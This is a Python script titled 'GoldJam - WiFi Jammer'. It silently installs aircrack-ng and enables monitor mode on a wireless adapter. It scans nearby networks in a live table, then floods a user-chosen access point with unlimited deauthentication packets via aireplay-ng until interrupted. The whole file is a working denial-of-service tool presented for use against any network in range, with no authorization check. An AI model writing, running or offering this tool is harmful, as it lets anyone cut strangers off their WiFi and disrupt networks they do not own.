#!/usr/bin/env python3

# GoldJam - WiFi Jammer
# Author: GoldSkull-777

import os
import subprocess
import time
import sys
import shutil
import signal

# ==================== Auto Dependency Installer ====================
def install_if_missing():
    def is_installed(cmd):
        return shutil.which(cmd) is not None

    def apt_install(pkg):
        subprocess.call(f"sudo apt-get install -y {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def pip_install(pkg):
        subprocess.call(f"python3 -m pip install {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[bold green][+] Checking dependencies...[/bold green]")
    if not is_installed("airmon-ng"):
        print("[bold red][!] Installing aircrack-ng suite...[/bold red]")
        apt_install("aircrack-ng")

    try:
        import rich
    except ImportError:
        print("[bold red][!] Installing Python module 'rich' for colorful output...[/bold red]")
        pip_install("rich")

install_if_missing()

# ==================== Imports ====================
from rich import print
from rich.table import Table
from rich.live import Live

# ==================== Utility ====================
def clear(): os.system('clear' if os.name == 'posix' else 'cls')
def run(cmd): return subprocess.getoutput(cmd)

def get_interfaces():
    return run("iw dev | awk '$1==\"Interface\"{print $2}'").splitlines()

def enable_monitor(iface):
    print(f"\n[bold green][+] Enabling monitor mode on {iface}...[/bold green]")
    subprocess.call("sudo airmon-ng check kill", shell=True)
    subprocess.call(f"sudo airmon-ng start {iface}", shell=True)
    time.sleep(1)
    return iface

def restore(iface):
    print("\n[bold green][+] Restoring adapter to managed mode and restarting services...[/bold green]")
    run(f"sudo ifconfig {iface} down")
    run(f"sudo iwconfig {iface} mode managed")
    run(f"sudo ifconfig {iface} up")
    run("sudo systemctl start NetworkManager")
    run("sudo systemctl start wpa_supplicant")
    print("[bold green][+] Adapter restored and ready to reconnect.[/bold green]")

def cleanup(file):
    if os.path.exists(f"{file}-01.csv"):
        os.remove(f"{file}-01.csv")

# ==================== CSV Parser ====================
def parse_networks(file):
    nets = []
    try:
        with open(f"{file}-01.csv", 'r', errors='ignore') as f:
            lines = f.read().split("\n\n")[0].splitlines()[2:]
            for l in lines:
                c = l.split(',')
                if len(c) > 13 and c[0].strip() and len(c[0].strip()) == 17:
                    essid = c[13].strip() if c[13].strip() != '' else '(Hidden)'
                    nets.append({'bssid': c[0].strip(), 'ch': c[3].strip(), 'pwr': c[8].strip(), 'essid': essid})
    except:
        pass
    return nets

# ==================== Live Scan ====================
def live_scan(iface, file):
    print(f"\n[bold cyan][+] Starting live scan on [bold yellow]{iface}[/bold yellow].[/bold cyan]")
    print("[bold green][*] PRESS [CTRL + C] once when your target appears in the list below to continue.[/bold green]")
    print("[bold magenta][*] Tip:[/bold magenta] Let it run for a few seconds for better detection.\n")

    cmd = ["sudo", "airodump-ng", "--write", file, "--output-format", "csv", iface]
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

    try:
        with Live(refresh_per_second=1, screen=True) as live:
            while True:
                table = Table(title="[bold magenta]📡 GoldJam Live Scan — Nearby WiFi Networks[/bold magenta]", show_header=True, header_style="bold blue")
                table.add_column("No", style="bold yellow", justify="center")
                table.add_column("ESSID", style="cyan", overflow="fold")
                table.add_column("BSSID", style="red")
                table.add_column("CH", style="magenta", justify="center")
                table.add_column("PWR", style="green", justify="center")

                nets = parse_networks(file)
                if nets:
                    for idx, n in enumerate(nets):
                        table.add_row(
                            str(idx+1),
                            n['essid'],
                            n['bssid'],
                            n['ch'],
                            n['pwr']
                        )
                else:
                    table.add_row("-", "[yellow]Scanning...[/yellow]", "-", "-", "-")
                live.update(table)
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[bold green][+] Scan stopped. Processing captured networks...[/bold green]")
    finally:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        time.sleep(1)

# ==================== Deauth ====================
def deauth_all(bssid, ch, iface):
    run(f"sudo iwconfig {iface} channel {ch}")
    print(f"\n[bold red][+] Launching jammer on BSSID: {bssid} (CH {ch})[/bold red]")
    print("[bold yellow][*] PRESS [CTRL + C] to stop jamming at any time.[/bold yellow]")
    print("[bold magenta][*] Keep monitoring for disconnections in another terminal if you wish.[/bold magenta]\n")
    try:
        subprocess.call(f"sudo aireplay-ng --deauth 0 -a {bssid} {iface}", shell=True)
    except KeyboardInterrupt:
        print("\n[bold cyan][+] Jam stopped by user.[/bold cyan]")

# ==================== Banner ====================
SKULL = """
[bold red]
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+-........:=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=:..            ...-#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..................    ..=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.....:+%@@@@@@@@@@%*-......#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#....-*@@@@@@@%##%%@@@@@@#=....=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#...-%@@@@*:..........:+%@@@@=...=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:..:@@@%:.................#@@@=...*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*....-+:....:*@@@@@@@@#-.....==.. .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.. ......:%@@@@@%#%@@@@%=........ :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...     .+@@#:......:*@@#..       -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.....  ....................  .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...:...  ..  .-#@@%=..     ...:...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=...-:.      -@@@@@@+.     ..=...:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..==..    ..-@@@@@@+.     ..-*..+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+......:::...:#%%%=...:::......=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:..=#@@@@@@@@#:.....*@@@@@@@@%+:.:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..#@@@@@@@@@@@-.  .:@@@@@@@@@@@%:.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.-@@@@@@@@@@@%.. .+@@@@@@@@@@@*..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.-@@@@@@@@@@*:.....+%@@@@@@@@@*..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....-#@@@#+-:...:##-....-=*%@@#=....%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...............@@@@-..............:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.... ..    .*@##@%..     .....:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=--=-...  .=@+-@*.. ...-+=--*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.  ......... .:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.            ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.....   .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++:..:.:=+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

               GoldJam - WiFi Jammer
                Author: GoldSkull-777
[/bold red]
"""

# ==================== Main ====================
def main():
    clear()
    print(SKULL)

    interfaces = get_interfaces()
    if not interfaces:
        print("[bold red][-] No wireless interfaces found. Exiting.[/bold red]")
        return

    for i, iface in enumerate(interfaces):
        print(f"[bold green][{i+1}] {iface}[/bold green]")
    while True:
        s = input("\n[+] Select interface number to use: ").strip()
        if s.isdigit() and 1 <= int(s) <= len(interfaces):
            iface = interfaces[int(s)-1]
            break

    iface = enable_monitor(iface)
    file = "goldjam_scan"

    live_scan(iface, file)

    nets = parse_networks(file)
    if not nets:
        print("[bold red][-] No networks found. Exiting.[/bold red]")
        cleanup(file)
        restore(iface)
        return

    print("\n[bold magenta]Available Networks:[/bold magenta]")
    print("%-3s %-25s %-20s %-5s %-6s" % ("No", "ESSID", "BSSID", "CH", "PWR"))
    print("-"*70)
    for i, n in enumerate(nets):
        print("%-3s %-25s %-20s %-5s %-6s" % (
            str(i+1),
            n['essid'],
            n['bssid'],
            n['ch'],
            n['pwr']
        ))

    while True:
        s = input("\n[+] Select target network number to jam: ").strip()
        if s.isdigit() and 1 <= int(s) <= len(nets):
            n = nets[int(s)-1]
            break

    deauth_all(n['bssid'], n['ch'], iface)
    cleanup(file)
    restore(iface)
    print("\n[bold green][+] GoldJam session complete. Thank you for using GoldJam by GoldSkull-777.[/bold green]\n")

if __name__ == '__main__':
    main()
